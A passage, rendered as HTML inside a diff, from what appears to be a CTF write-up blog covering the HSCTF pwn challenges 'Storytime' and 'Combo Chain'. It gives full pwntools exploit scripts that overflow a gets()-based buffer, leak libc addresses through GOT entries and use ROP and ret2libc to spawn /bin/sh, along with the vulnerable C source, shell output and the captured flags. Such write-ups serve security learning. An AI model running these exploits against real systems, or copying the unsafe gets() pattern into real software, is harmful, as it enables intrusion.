+<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"pwn.hsctf.com"</span><span class="p">,</span> <span class="mi">3333</span><span class="p">)</span>
+
+<span class="c1"># Addresses we already know from the binary
+</span><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span>
+<span class="n">read_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'read'</span><span class="p">]</span>
+<span class="n">main_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
+
+<span class="c1"># Gadgets
+</span><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x0000000000400703</span>
+<span class="n">pop_rsi_r15</span> <span class="o">=</span> <span class="mh">0x0000000000400701</span>
+<span class="n">pop_rdx</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="c1"># Helper function to call a function with specified args
+</span><span class="k">def</span> <span class="nf">call</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">,</span> <span class="n">arg3</span><span class="p">):</span>
+    <span class="n">output</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="k">if</span> <span class="n">arg1</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">output</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">arg1</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">arg2</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">output</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">arg2</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+    <span class="k">if</span> <span class="n">arg3</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">pop_rdx</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="k">print</span> <span class="s">'No rdx gadget provided'</span>
+                <span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+                <span class="n">output</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">arg3</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">output</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">func</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x30</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># Overflow the buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">call</span><span class="p">(</span><span class="n">write_plt</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">read_got</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span> <span class="c1"># Call write(1, read_got, &lt;something&gt;)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span> <span class="c1"># Jump back to main, important later
+</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">leak</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'story'</span><span class="p">)[:</span><span class="mi">8</span><span class="p">]))</span> <span class="c1"># Leaked address is the first 8 bytes received (64bit)
+</span>
+<span class="k">print</span> <span class="n">leak</span>
+</code></pre></div></div>
+
+<p>The exploit script makes use of return oriented programming. If you don’t know what that is, I suggest you read through my writeups of the ROP Emporium challenges <a href="/pwn/2019/07/19/rop-emporium-challenges.html" target="blank">here</a>, specifically split64, although you may have to read the previous writeups if you are very new to binary exploitation.</p>
+
+<p>I wrote a call() helper function to help keep the payload compact. The exploit basically does the following:</p>
+
+<ul>
+  <li>Overflow the buffer.</li>
+  <li>Call <code class="highlighter-rouge">write(1, read_got, &lt;whatever_is_in_rdx&gt;)</code> where the first argument is 1 meaning stdout, second argument is read’s GOT entry (explained above), and the third argument is something we can’t control since there aren’t any pop rdx gadgets, so we just hope rdx has a positive value &gt; 8 (since the third argument is the number of bytes to write).</li>
+  <li>Jump back to main (this will be important a little later).</li>
+  <li>The leaked address will be the first 8 bytes we receive from the write() call we just made.</li>
+</ul>
+
+<p>We run this script a bunch of times and do indeed see that ASLR is enabled, since the libc address of read() changes, as shown below.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» ./exploit.py   
+0x7f0100c9c250
+
+» ./exploit.py   
+0x7f828be0b250
+
+» ./exploit.py   
+0x7f4aebd51250
+
+» ./exploit.py    
+0x7f0372072250
+</code></pre></div></div>
+
+<p>So now we know we definitely have to do a ret2libc attack. We’ve got read’s libc address, so the first order of business is to figure out which libc the program is using. I use <a href="https://github.com/niklasb/libc-database">niklasb’s libc-database</a> to do this. You just download all the libc libraries using <code class="highlighter-rouge">./get</code>, then call <code class="highlighter-rouge">./find &lt;func_name&gt; &lt;last_12_bits_of_addr&gt;</code></p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» ./find <span class="nb">read </span>250
+ubuntu-xenial-amd64-libc6 <span class="o">(</span><span class="nb">id </span>libc6_2.23-0ubuntu10_amd64<span class="o">)</span>
+archive-glibc <span class="o">(</span><span class="nb">id </span>libc6_2.23-0ubuntu11_amd64<span class="o">)</span>
+archive-old-glibc <span class="o">(</span><span class="nb">id </span>libc6-i386_2.19-10ubuntu2.3_amd64<span class="o">)</span>
+</code></pre></div></div>
+
+<p>I chose the first entry (although which you choose shouldn’t matter). read() happens to be classified as a useful function, so we can just use ./dump to dump a bunch of useful offsets.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» ./dump libc6_2.23-0ubuntu10_amd64
+offset___libc_start_main_ret <span class="o">=</span> 0x20830
+offset_system <span class="o">=</span> 0x0000000000045390
+offset_dup2 <span class="o">=</span> 0x00000000000f7970
+offset_read <span class="o">=</span> 0x00000000000f7250
+offset_write <span class="o">=</span> 0x00000000000f72b0
+offset_str_bin_sh <span class="o">=</span> 0x18cd57
+</code></pre></div></div>
+
+<p>With the offsets, we can now finish the rest of the exploit.</p>
+
+<p>This time, we leak the address of read inside libc, calculate the libc base address on the fly (by doing <code class="highlighter-rouge">leaked_read_address-offset_of_read_in_libc</code>), then use ‘/bin/sh’ and system’s offsets to calculate their addresses. Then we just jump back to main to restart the entire program, build the payload again, only this time we call system(‘/bin/sh’).</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">BINARY</span> <span class="o">=</span> <span class="s">'./storytime'</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'critical'</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"pwn.hsctf.com"</span><span class="p">,</span> <span class="mi">3333</span><span class="p">)</span>
+
+<span class="c1"># Addresses we already know from the binary
+</span><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span>
+<span class="n">read_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'read'</span><span class="p">]</span>
+<span class="n">main_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
+
+<span class="c1"># Gadgets
+</span><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x0000000000400703</span>
+<span class="n">pop_rsi_r15</span> <span class="o">=</span> <span class="mh">0x0000000000400701</span>
+<span class="n">pop_rdx</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="c1"># Helper function to call functions with specified args
+</span><span class="k">def</span> <span class="nf">call</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">,</span> <span class="n">arg3</span><span class="p">):</span>
+    <span class="n">output</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="k">if</span> <span class="n">arg1</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">output</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">arg1</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">arg2</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">output</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">arg2</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+    <span class="k">if</span> <span class="n">arg3</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">pop_rdx</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="k">print</span> <span class="s">'No rdx gadget provided'</span>
+                <span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+                <span class="n">output</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">arg3</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">output</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">func</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x30</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># Overflow the buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">call</span><span class="p">(</span><span class="n">write_plt</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">read_got</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span> <span class="c1"># Call write(1, read_got, &lt;something&gt;)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span> <span class="c1"># Jump back to main
+</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Offsets from the libc library
+</span><span class="n">read_libc_offset</span> <span class="o">=</span> <span class="mh">0x00000000000f7250</span>
+<span class="n">system_libc_offset</span> <span class="o">=</span> <span class="mh">0x0000000000045390</span>
+<span class="n">bin_sh_libc_offset</span> <span class="o">=</span> <span class="mh">0x18cd57</span>
+
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'story'</span><span class="p">)[:</span><span class="mi">8</span><span class="p">])</span> <span class="o">-</span> <span class="n">read_libc_offset</span> <span class="c1"># Calculate the libc base address
+</span><span class="k">print</span> <span class="s">'libc_base: {}'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">system_libc_offset</span> <span class="c1"># Use the base address to find system's address
+</span><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">bin_sh_libc_offset</span> <span class="c1"># Use the base address to find '/bin/sh's address
+</span>
+<span class="c1"># We are at main again, so we redo the payload but call system('/bin/sh') this time
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x30</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">call</span><span class="p">(</span><span class="n">system_addr</span><span class="p">,</span> <span class="n">bin_sh</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': </span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>We get the flag!</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» ./exploit.py
+libc_base: 0x7fdb6d860000
+<span class="nv">$ </span><span class="nb">ls
+</span>bin
+dev
+exploit.py
+flag
+lib
+lib32
+lib64
+storytime
+<span class="nv">$ </span><span class="nb">cat </span>flag
+hsctf<span class="o">{</span>th4nk7_f0r_th3_g00d_st0ry_yay-314879357<span class="o">}</span>
+<span class="nv">$ </span> 
+</code></pre></div></div>
+
+<p>Flag: <code class="highlighter-rouge">hsctf{th4nk7_f0r_th3_g00d_st0ry_yay-314879357}</code></p>
+
+<h1 id="combo-chain">Combo Chain</h1>
+
+<h3 id="challenge-4">Challenge</h3>
+
+<blockquote>
+  <p>Written by: Ptomerty</p>
+
+  <p>I’ve been really into Super Smash Brothers Melee lately…</p>
+
+  <p>nc pwn.hsctf.com 2345</p>
+
+  <p>Note: If you’re trying to use python or a similar program to run your exploit, make sure to keep stdin alive with cat, like this: (python; cat -) | nc pwn.hsctf.com <port></port></p>
+
+  <p>6/3/19 7:35 AM: Binary updated, SHA-1: 0bf0640256566d2505113f485949ec96f1cd0bb9 combo-chain</p>
+</blockquote>
+
+<p>The challenge archive contained the following files.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>combo-chain
+combo-chain.c
+</code></pre></div></div>
+
+<h3 id="solution-4">Solution</h3>
+
+<p>This challenge is the exact same as Storytime above, except we don’t have access to the write() function, so we just use printf() instead to leak gets()’s libc address using it’s GOT entry. We then use it to find the libc version, calculate the libc base address, then re-exploit the program and call system(‘/bin/sh’) instead.</p>
+
+<p>The one weird issue I ran into was that after overflowing the buffer, I had to jump to a ‘nop; ret;’ gadget before doing the actual exploit. I’m still unsure why that happened to be the case, but it did, so I guess that’s just a note to take: If your exploit isn’t working even though it should, you might just need a nop gadget after the overflow to align (?) something.</p>
+
+<p>The code is shown below.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">dest</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Dude you hear about that new game called /bin/sh"</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"? Enter the right combo for some COMBO CARNAGE!: "</span><span class="p">);</span>
+  <span class="n">gets</span><span class="p">(</span><span class="n">dest</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+  <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span><span class="n">gid</span><span class="p">,</span><span class="n">gid</span><span class="p">);</span>
+  <span class="n">vuln</span><span class="p">();</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>My exploit is shown below. It’s the exact same as the one above from Storytime so I will skip the explanation. I have started to use a template for my exploits from now on. You can find it <a href="https://github.com/farazsth98/ctf-pwntools-skeleton">here</a>.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="c1"># ---------------- START OF BOILERPLATE ------------------- #
+</span>
+<span class="n">argv</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span>
+
+<span class="n">DEBUG</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="n">BINARY</span> <span class="o">=</span> <span class="s">'./combo-chain'</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">BINARY</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">,</span> <span class="s">'-v'</span><span class="p">]</span>
+
+<span class="k">if</span> <span class="n">context</span><span class="o">.</span><span class="n">bits</span> <span class="o">==</span> <span class="mi">64</span><span class="p">:</span>
+  <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s">'ROPgadget'</span><span class="p">,</span> <span class="s">'--binary'</span><span class="p">,</span> <span class="n">BINARY</span><span class="p">])</span>
+  <span class="n">gadgets</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
+  <span class="n">gadgets</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">' : '</span><span class="p">),</span><span class="n">gadgets</span><span class="p">)</span>
+  <span class="n">gadgets</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">16</span><span class="p">),</span><span class="n">x</span><span class="p">[</span><span class="mi">1</span><span class="p">]),</span><span class="n">gadgets</span><span class="p">)</span>
+  <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+  <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mi">0</span>
+  <span class="n">pop_rsi_r15</span> <span class="o">=</span> <span class="mi">0</span>
+  <span class="n">pop_rdx</span> <span class="o">=</span> <span class="mi">0</span>
+
+  <span class="k">for</span> <span class="n">addr</span><span class="p">,</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">gadgets</span><span class="p">:</span>
+    <span class="k">if</span> <span class="s">'pop rdi ; ret'</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
+      <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">addr</span>
+    <span class="k">if</span> <span class="s">'pop rsi ; pop r15 ; ret'</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
+      <span class="n">pop_rsi_r15</span> <span class="o">=</span> <span class="n">addr</span>
+    <span class="k">if</span> <span class="s">'pop rdx ; ret'</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
+      <span class="n">pop_rdx</span> <span class="o">=</span> <span class="n">addr</span>
+
+  <span class="k">def</span> <span class="nf">call</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">):</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="k">if</span> <span class="n">a1</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
+      <span class="n">out</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">a2</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
+      <span class="n">out</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">a2</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+    <span class="k">if</span> <span class="n">a3</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
+      <span class="k">if</span> <span class="n">pop_rdx</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">'RDX GADGET NOT FOUND'</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+      <span class="k">else</span><span class="p">:</span>
+        <span class="n">out</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">a3</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">out</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">attach_gdb</span><span class="p">():</span>
+  <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
+  <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
+  <span class="k">global</span> <span class="n">sh</span>
+  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="n">stdout</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">PTY</span>
+    <span class="n">stdin</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">PTY</span>
+
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">stdout</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">stdin</span><span class="p">)</span>
+
+    <span class="c1"># if DEBUG:
+</span>    <span class="c1">#   attach_gdb()
+</span>
+    <span class="n">REMOTE</span> <span class="o">=</span> <span class="bp">False</span>
+  <span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'pwn.hsctf.com'</span><span class="p">,</span> <span class="mi">2345</span><span class="p">)</span>
+    <span class="n">REMOTE</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">start</span><span class="p">()</span>
+
+<span class="c1"># ---------------- END OF BOILERPLATE --------------------- #
+</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
+
+<span class="n">gets_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'gets'</span><span class="p">]</span>
+<span class="n">printf_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'printf'</span><span class="p">]</span>
+<span class="n">main_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
+<span class="n">nop</span> <span class="o">=</span> <span class="mh">0x000000000040114f</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">16</span> <span class="c1"># Overflow the buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">nop</span><span class="p">)</span> <span class="c1"># Added here because the exploit wasn't working without it for some reason
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">call</span><span class="p">(</span><span class="n">printf_plt</span><span class="p">,</span> <span class="n">gets_got</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span> <span class="c1"># Call printf with gets()'s GOT address to leak the gets() libc address
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span> <span class="c1"># Jump back to main
+</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"!: "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="c1"># Leaked address
+</span><span class="k">print</span> <span class="s">'Leaked gets libc address: {}'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+
+<span class="c1"># Use niklasb's libc_database to find libc version using the leak now
+</span>
+<span class="c1"># Use offsets from the libc library
+</span><span class="n">gets_offset</span> <span class="o">=</span> <span class="mh">0x000000000006ed80</span>
+<span class="n">system_offset</span> <span class="o">=</span> <span class="mh">0x0000000000045390</span>
+<span class="n">bin_sh_offset</span> <span class="o">=</span> <span class="mh">0x18cd57</span>
+
+<span class="c1"># Calculate libc base then the addresses required
+</span><span class="n">libc_base</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">gets_offset</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">system_offset</span>
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">bin_sh_offset</span>
+
+<span class="c1"># Re-exploit and call system('/bin/sh')
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">16</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">nop</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">call</span><span class="p">(</span><span class="n">system_addr</span><span class="p">,</span> <span class="n">bin_sh</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Running the exploit.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» ./exploit.py remote
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/root/Documents/hsctf-6/pwn/combo-chain/bin/combo-chain'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+<span class="o">[</span>+] Starting <span class="nb">local </span>process <span class="s1">'/usr/local/bin/ROPgadget'</span>: pid 6822
+<span class="o">[</span>+] Receiving all data: Done <span class="o">(</span>3.89KB<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Stopped process <span class="s1">'/usr/local/bin/ROPgadget'</span> <span class="o">(</span>pid 6822<span class="o">)</span>
+<span class="o">[</span>+] Opening connection to pwn.hsctf.com on port 2345: Done
+Leaked gets libc address: 0x7fbcb22b7d80
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+<span class="nv">$ </span><span class="nb">ls
+</span>bin
+combo-chain
+combo-chain.c
+dev
+flag
+lib
+lib32
+lib64
+<span class="nv">$ </span><span class="nb">cat </span>flag
+hsctf<span class="o">{</span>i_thought_konami_code_would_work_here<span class="o">}</span>
+<span class="nv">$ </span> 
+</code></pre></div></div>
+
